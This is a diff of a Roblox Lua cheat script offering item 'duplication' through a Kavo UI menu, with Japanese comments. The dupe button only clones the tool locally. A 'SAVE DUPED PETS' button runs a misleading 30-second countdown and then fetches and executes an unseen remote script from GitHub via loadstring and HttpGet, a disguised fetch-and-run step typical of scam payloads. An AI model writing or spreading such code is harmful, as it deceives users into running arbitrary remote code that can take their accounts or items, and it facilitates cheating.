@@ -2,101 +2,73 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 
--- Rayfield 読み込みチェック付き
-local success, Rayfield = pcall(function()
-	return loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
-end)
+-- Kavo UIのロード
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
 
-if not success then
-	warn("⚠️ Rayfield failed to load:", Rayfield)
-	return
-end
+-- メインタブ作成
+local MainTab = Window:NewTab("Main")
+local MainSection = MainTab:NewSection("Main Controls")
 
--- UI Window Setup
-local Window = Rayfield:CreateWindow({
-	Name = "2.0 - New Flow",
-	LoadingTitle = "Booting Up...",
-	LoadingSubtitle = "Made By Glow a Guardian",
-	ConfigurationSaving = {
-		Enabled = false
-	},
-	Discord = {
-		Enabled = false
-	},
-	KeySystem = false
-})
+-- ツール名表示ラベル（初期値：Nothing）
+local currentTool = "Nothing"
+MainSection:NewLabel("Holding: " .. currentTool)
 
-local MainTab = Window:CreateTab("Main", 0)
-
-local toolLabel = MainTab:CreateParagraph({
-	Title = "Holding:",
-	Content = "Nothing"
-})
-
+-- 定期更新：現在持っているツール名を表示
 RunService.RenderStepped:Connect(function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
-	if tool then
-		toolLabel:Set({Title = "Holding:", Content = tool.Name})
-	else
-		toolLabel:Set({Title = "Holding:", Content = "Nothing"})
+	local name = tool and tool.Name or "Nothing"
+	if name ~= currentTool then
+		currentTool = name
+		MainSection:UpdateLabel("Holding: " .. currentTool)
 	end
 end)
 
+-- Dupe 回数入力
 local dupeAmount = 1
-MainTab:CreateInput({
-	Name = "Dupe Amount (1-100)",
-	PlaceholderText = "Enter a number",
-	RemoveTextAfterFocusLost = false,
-	Callback = function(text)
-		local number = tonumber(text)
-		if number and number >= 1 and number <= 100 then
-			dupeAmount = number
-		else
-			warn("Enter a number between 1 and 100")
-		end
+MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
+	local number = tonumber(text)
+	if number and number >= 1 and number <= 100 then
+		dupeAmount = number
+	else
+		warn("Enter a number between 1 and 100")
 	end
-})
+end)
 
-MainTab:CreateButton({
-	Name = "DUPE",
-	Callback = function()
-		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
-		if not tool then
-			warn("No tool to duplicate.")
-			return
-		end
-		for i = 1, dupeAmount do
-			local clone = tool:Clone()
-			clone.Parent = player.Backpack
-		end
+-- 複製ボタン
+MainSection:NewButton("DUPE", "Duplicate your tool", function()
+	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
+	if not tool then
+		warn("No tool to duplicate.")
+		return
 	end
-})
+	for i = 1, dupeAmount do
+		local clone = tool:Clone()
+		clone.Parent = player.Backpack
+	end
+end)
 
-local saveStatusLabel = MainTab:CreateParagraph({
-	Title = "SAVE STATUS",
-	Content = "Ready"
-})
+-- 状態表示用ラベル
+local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
 
-MainTab:CreateButton({
-	Name = "SAVE DUPED PETS",
-	Callback = function()
-		local countdown = 30
-		for i = countdown, 1, -1 do
-			saveStatusLabel:Set({
-				Content = "⌛ Loading pet information... (" .. i .. "s)"
-			})
+-- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
+MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+	task.spawn(function()
+		for i = 30, 1, -1 do
+			statusLabel:UpdateLabel("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
 		end
 
-		saveStatusLabel:Set({Content = "🚀 Booting..."})
+		statusLabel:UpdateLabel("SAVE STATUS: 🚀 Booting...")
+
 		local success, err = pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
 		end)
 
 		if success then
-			saveStatusLabel:Set({Content = "✅ Success!"})
+			statusLabel:UpdateLabel("SAVE STATUS: ✅ Success!")
 		else
-			saveStatusLabel:Set({Content = "❌ Failed to load script: " .. tostring(err)})
+			statusLabel:UpdateLabel("SAVE STATUS: ❌ Error: " .. tostring(err))
 		end
-	end
-})
+	end)
+end)
